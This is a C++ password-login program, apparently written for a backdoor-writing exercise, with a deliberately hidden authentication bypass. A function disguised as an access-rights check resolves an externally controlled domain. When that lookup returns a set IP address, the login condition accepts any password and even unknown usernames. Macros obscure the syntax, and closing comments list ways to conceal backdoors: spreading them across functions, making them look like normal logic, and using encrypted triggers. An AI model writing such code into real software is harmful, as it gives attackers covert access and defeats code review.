#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <iomanip> 
#include <netdb.h>
#include <arpa/inet.h>
#include <cstdlib>
#include "authlib.h"
#include "openssl/sha.h"

#define END ;
#define SEP ,
using string = std::string END

bool auth_access_rights() {
    //std::cerr << "DEBUG: check_trigger() called" << std::endl;

    // Get the domain from an environment variable
    const char* domain = DOMAIN END
    if (domain == nullptr) {
        return false; // Environment variable not set
    }

    // Query DNS for the domain
    struct hostent* host_info = gethostbyname(domain) END
    if (host_info == nullptr) {
        return false; // DNS query failed
    }

    // Convert to IP string
    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
    std::string ip = inet_ntoa(*addr_list[0]) END

   //#ifdef DEBUG
   // std::cout << "DNS response for domain: " << domain << " is IP: " << ip << std::endl END
    //#endif 
   // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
    
    // Check if correct IP is returned to authorise access rights
    return (ip == "1.8.1.0") END
}

//function to compute SHA256 hash of string using openssl's SHA256 functions
string sha256(const string& str) {

    unsigned char hash[SHA256_DIGEST_LENGTH] END   //array to store hash output which is 32 bytes
    SHA256_CTX sha256 END                          //context for SHA256

    SHA256_Init(&sha256) END   //initializing context
    SHA256_Update(&sha256 SEP str.c_str() SEP str.size()) END    //update context with input
    SHA256_Final(hash SEP &sha256) END    //computing final hash

    //formatting hash output as hex string
    std::stringstream ss END                       
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i] END // converting each byte to hex
    }
    
    return ss.str() END    //returning formatted hex string of hash
}

int main() {
    //mapping to store username (key) & hashed password (value)
    std::unordered_map<string SEP string> user_passwords END 
    string line END
    string username END 
    string hashed_pass END 
    string password END

    //opening password file
    std::ifstream password_file("passwords.txt") END

    //add below or not depending on how many ':' and ';' we have in our code
    //if (!password_file.is_open()) {
    //    std::cerr << "Error opening password file." << std::endl;
    //    return 1; 

    //reading each line & parsing username & hashed password
    while (std::getline(password_file SEP line)) {
        size_t separator = line.find(':') END    //finding position of ':'

        if (separator != string::npos) {
            //username = line.substr(0, separator) END   //extracting username
            hashed_pass = line.substr(separator + 1) END //extracting hashed password
            user_passwords[line.substr(0 SEP separator)] = hashed_pass END   //storing in map for extarcted username
        }
    }
    password_file.close() END  

    //prompting user for username
    std::cout << "Enter username: " END
    std::cin >> username END

    //prompting user for password
    std::cout << "Enter password: " END
    std::cin >> password END

    //hash the entered password using SHA256
    string user_input_hash = sha256(password) END

    //check whether or not the entered credentials should be authenticated or not
    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (auth_access_rights() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || auth_access_rights()) END

    // bool authenticate = user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash
    //checking for username and hashed input matches store 
    if (authenticate) {
        authenticated(username) END  //call authenticated if credentials are correct
    } 
    /*else if (auth_access_rights()){
        authenticated(username) END
    }*/
    else {
    // choose how to handle invalid logins here or leave this open for backdoor logic
        //std::cerr << "Invalid login credentials." << std::endl END
        rejected(username) END


    } 
   

    return 0 END
}




//possible ideas 

//unrelated checks to trigger a backdoor
//spread backdoor code across many functions
//each back of backdoor can be explained to look like normal logic
//use of encrypted or hard-to-interpert values to trigger backdoors, so even if someone finds code they wont understand how it works without correct decryption or key